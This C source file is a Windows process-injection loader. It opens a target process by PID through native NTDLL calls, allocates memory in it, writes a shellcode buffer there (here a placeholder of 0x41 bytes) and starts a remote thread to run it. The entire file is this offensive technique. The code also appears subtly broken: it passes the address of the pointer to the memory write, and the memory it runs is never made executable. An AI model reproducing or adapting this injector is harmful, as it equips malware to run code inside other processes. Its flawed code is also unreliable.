#include "ntapi.h"

HMODULE GetModule(IN LPCWSTR moduleName)
{
    HMODULE hModule = NULL;
    hModule = GetModuleHandleW(moduleName);
    if (hModule == NULL)
    {
        warn("Error: failed to get handle to module, 0x%lx\n", GetLastError());
        return NULL;
    }
    else 
    {
        //okay("Got handle 0x%p to module %S", hModule, moduleName);
        okay("Got handle to module");
        info("[ %S ] --> [ 0x%p ]\n", moduleName, hModule);
        return hModule;
    }
}

int main(int argc, char* argv[])
{
    DWORD PID = 0;
    NTSTATUS STATUS = NULL;
    HMODULE hNTDLL = NULL;
    LPVOID baseAddress = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    
    /* const keyword makes it so sc is placed in .rdata */
    CONST UCHAR sc[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
    SIZE_T scSize = sizeof(sc);
    
    if (argc < 2)
    {
        info("Usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    hNTDLL = GetModule(L"NTDLL");

    /*init struct for ntOpenProcess*/
    OBJECT_ATTRIBUTES oa = {sizeof(oa), NULL };
    CLIENT_ID cid = { (HANDLE)PID, NULL };

    info("Populating prototypes...");
    NtOpenProcess open = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtAllocateVirtualMemory alloc = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory write = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    NtCreateThreadEx thread = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    NtClose close = (NtClose)GetProcAddress(hNTDLL, "NtClose");
    
    okay("Attempting injection...");
    STATUS = open(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (STATUS != STATUS_SUCCESS)
    {
        warn("Error: NtOpenProcess returned NTSTATUS 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("Got handle for process");
    info("[ %ld ] --> [ 0x%p ]", PID, hProcess);

    //do NtAllocateVirtualMemory and NtWriteVirtualMemory
    STATUS = alloc(hProcess, &baseAddress, 0, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (STATUS != STATUS_SUCCESS)
    {
        warn("Error: NtAllocateVirtualMemory returned NTSTATUS 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("Allocated %ld bytes in process 0x%p", scSize, hProcess);
    
    STATUS = write(hProcess, &baseAddress, sc, scSize, NULL);
    if (STATUS != STATUS_SUCCESS)
    {
        warn("Error: NtWriteVirtualMemory returned NTSTATUS 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("Wrote %ld bytes into process 0x%p", scSize, hProcess);
    okay("Executing thread...");

    STATUS = thread(&hThread, THREAD_ALL_ACCESS, &oa, hProcess, baseAddress, NULL, 0, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS)
    {
        warn("Error: NtCreateThreadEx returned NTSTATUS 0x%lx", STATUS);
    }
    okay("Thread created. Waiting for thread to finish...");

    WaitForSingleObject(hThread, INFINITE);
    okay("Thread finished! Cleaning up...");

    //cleanup
    return EXIT_SUCCESS;
}
